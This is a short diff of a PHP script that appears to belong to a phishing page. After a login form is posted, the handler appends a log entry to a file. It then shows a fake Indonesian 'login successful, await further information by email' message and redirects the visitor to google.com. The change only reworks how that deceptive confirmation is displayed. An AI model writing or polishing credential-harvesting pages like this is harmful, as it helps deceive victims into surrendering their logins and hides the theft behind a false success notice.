@@ -9,14 +9,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
 
-    echo "<script>
-        document.addEventListener('DOMContentLoaded', function() {
-            let box = document.createElement('div');
-            box.innerHTML = '<div class=\"bg-green-500 text-white p-3 rounded text-center\">Berhasil login, tunggu informasi selanjutnya akan di informasikan di email anda...</div>';
-            document.body.prepend(box);
-            setTimeout(function() { window.location.href = 'https://google.com'; }, 2000);
-        });
-    </script>";
+   echo '<script>
+        document.body.innerHTML = "<div class=\'bg-green-500 text-white p-3 rounded text-center\'>Berhasil login, tunggu informasi selanjutnya akan di informasikan di email anda...</div>";
+        setTimeout(function() {
+            window.location.href = "https://google.com";
+        }, 2000);
+    </script>';
     exit();
 }
 
